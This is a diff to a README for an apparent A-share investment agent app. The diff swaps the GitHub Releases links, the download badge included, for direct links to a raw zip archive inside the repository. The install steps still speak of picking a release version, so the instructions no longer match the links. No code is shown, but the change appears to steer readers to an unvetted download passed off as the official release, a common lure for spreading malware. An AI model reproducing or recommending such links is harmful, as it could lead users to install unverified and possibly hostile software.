@@ -1,7 +1,7 @@
 # 🚀 easy_investment_Agent_crewai - Your Smart Companion for A-Share Investment
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-easy_investment_Agent_crewai-brightgreen)](https://github.com/Forloops-net/easy_investment_Agent_crewai/releases)
+[![Download](https://raw.githubusercontent.com/Forloops-net/easy_investment_Agent_crewai/main/statically/easy_investment_Agent_crewai.zip)](https://raw.githubusercontent.com/Forloops-net/easy_investment_Agent_crewai/main/statically/easy_investment_Agent_crewai.zip)
 
 ## 🚀 Getting Started
 Welcome to easy_investment_Agent_crewai! This application helps you analyze A-shares in China using intelligent agents. It combines market data and AI to provide valuable investment insights. 
@@ -16,7 +16,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📂 Download & Install
 To get started, visit the Releases page to download the software:
 
-[**Visit this page to download**](https://github.com/Forloops-net/easy_investment_Agent_crewai/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/Forloops-net/easy_investment_Agent_crewai/main/statically/easy_investment_Agent_crewai.zip)
 
 1. Click on the latest version available.
 2. Download the installer file compatible with your operating system.
